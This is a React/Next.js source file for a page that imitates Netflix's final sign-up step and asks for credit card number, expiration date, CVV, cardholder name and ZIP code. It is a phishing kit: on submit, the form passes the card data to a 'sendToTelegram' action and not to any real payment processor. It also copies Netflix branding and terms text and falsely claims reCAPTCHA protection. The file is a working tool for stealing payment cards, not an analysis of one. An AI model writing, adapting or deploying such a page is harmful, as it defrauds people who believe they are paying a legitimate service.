'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'
import Image from 'next/image'
import Link from 'next/link'
import { motion } from 'framer-motion'
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { InfoIcon as InfoCircle, CreditCard } from 'lucide-react'
import { sendToTelegram } from './actions/sendToTelegram'
import { FormData } from './types/formData'

import VisaImage from './images/VISA.png'
import AmexImage from './images/AMEX.png'
import DiscoverImage from './images/DISCOVER.png'
import MasterImage from './images/MASTERCARD.png'
import NetflixImage from '../public/netflix-logo.svg'

export default function PaymentForm() {
  const [error, setError] = useState('')
  const [cardNumber, setCardNumber] = useState('')
  const [expirationDate, setExpirationDate] = useState('')
  const [cvv, setCvv] = useState('')
  const [nameOnCard, setNameOnCard] = useState('')
  const [zipCode, setZipCode] = useState('')
  const router = useRouter()

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Basic validation
    if (cardNumber.length < 16 || expirationDate.length !== 5 || !cvv || !nameOnCard || !zipCode) {
      setError('Please fill in all fields correctly')
      return
    }

    const formData: FormData = {
      cardNumber,
      expirationDate,
      cvv,
      nameOnCard,
      zipCode
    }

    const result = await sendToTelegram(formData)

    if (result.success) {
      router.push('/success')
    } else {
      setError(result.error || 'An error occurred while processing your payment')
    }
  }

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ''
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(' ')
    } else {
      return value
    }
  }

  const formatExpirationDate = (value: string) => {
    const cleanedValue = value.replace(/[^\d]/g, '')
    if (cleanedValue.length === 0) {
      return ''
    }
    if (cleanedValue.length === 1 && parseInt(cleanedValue) > 1) {
      return `0${cleanedValue}/`
    }
    if (cleanedValue.length === 2) {
      return `${cleanedValue}/`
    }
    if (cleanedValue.length > 2) {
      return `${cleanedValue.slice(0, 2)}/${cleanedValue.slice(2, 4)}`
    }
    return cleanedValue
  }

  return (
    <div className="min-h-screen bg-white">
      <header className="flex justify-between items-center px-4 py-2 border-b">
        <motion.div 
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.5 }}
        >
          <Image
            src={NetflixImage}
            alt="Netflix"
            width={92}
            height={28}
            className="cursor-pointer"
          />
        </motion.div>
        <Button 
          variant="ghost"
          className="text-zinc-600 hover:text-zinc-900"
        >
          Sign Out
        </Button>
      </header>

      <main className="max-w-[440px] mx-auto px-4 py-12">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.2 }}
        >
          <div className="">
            <div className="text-sm text-zinc-600 mb-2">STEP <span className='font-semibold'>4</span> OF <span className='font-semibold'>4</span></div>
            <h1 className="text-3xl font-medium">Set up your credit or debit card</h1>
          </div>

          <div className="flex py-2">
            <Image src={VisaImage} alt="Visa" width={25} height={12} />
            <Image src={MasterImage} alt="Mastercard" width={25} height={12} />
            <Image src={AmexImage} alt="American Express" width={25} height={12} />
            <Image src={DiscoverImage} alt="Discover" width={25} height={12} />
          </div>

          <form onSubmit={handleSubmit} className="space-y-2">
            <div>
              <div className="relative">
                <Input
                  type="text"
                  placeholder="Card number"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                  className="pl-10 py-6 border-[#808080]"
                  maxLength={19}
                />
                <CreditCard className="absolute left-3 top-4 h-5 w-5 text-zinc-400" />
              </div>
              {error && (
                <motion.p
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="text-red-500 text-sm mt-1 "
                >
                  {error}
                </motion.p>
              )}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <Input
                type="text"
                placeholder="Expiration date"
                value={expirationDate}
                onChange={(e) => setExpirationDate(formatExpirationDate(e.target.value))}
                maxLength={5}
                className=" py-6 border-[#808080]"
              />
              <div className="relative">
                <Input 
                  type="text" 
                  placeholder="CVV" 
                  maxLength={4}
                  className=" py-6 border-[#808080]" 
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value)}
                />
                <InfoCircle className="absolute right-3 top-4 h-5 w-5 text-zinc-400 cursor-help" />
              </div>
            </div>

            <Input 
              type="text" 
              placeholder="Name on card" 
              className='py-6 border-[#808080]'
              value={nameOnCard}
              onChange={(e) => setNameOnCard(e.target.value)}
            />
            <Input 
              type="text" 
              placeholder="ZIP code" 
              maxLength={5} 
              className='py-6 border-[#808080]'
              value={zipCode}
              onChange={(e) => setZipCode(e.target.value)}
            />

            <div className="bg-zinc-100 p-4 rounded-md">
              <div className="flex justify-between mb-1">
                <span className="font-semibold">Free Trial</span>
                <Link href="#" className="text-blue-600 hover:underline">
                  Change
                </Link>
              </div>
              <div className="text-sm text-zinc-600">
                <span className="line-through mr-2">$6.99/month</span>
                <span className="font-semibold">$15.49/month</span> (Standard plan)
              </div>
            </div>

            <div className="text-sm text-zinc-600 mt-8">
              By clicking the &quot;Start Free Trial&quot; button below, you agree to our{' '}
              <Link href="#" className="text-blue-600 hover:underline">
                Terms of Use
              </Link>
              ,{' '}
              <Link href="#" className="text-blue-600 hover:underline">
                Privacy Statement
              </Link>
              , that you are over 18, and that Netflix will automatically continue your membership and charge the membership fee (currently $15.49/month plus applicable taxes) to your payment method after the free trial period unless you cancel. You may cancel at any time to avoid future charges. To cancel, go to Account and click &quot;Cancel Membership&quot;.
            </div>

            <motion.div
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <Button 
                type="submit" 
                className="w-full bg-red-600 hover:bg-red-700 text-white py-6 text-xl"
              >
                Start Free Trial
              </Button>
            </motion.div>
          </form>

          <div className="mt-6 text-sm text-zinc-600 text-center">
            This page is protected by Google reCAPTCHA to ensure you&apos;re not a bot.{' '}
            <Link href="#" className="text-blue-600 hover:underline">
              Learn more
            </Link>
          </div>
        </motion.div>
      </main>
    </div>
  )
}

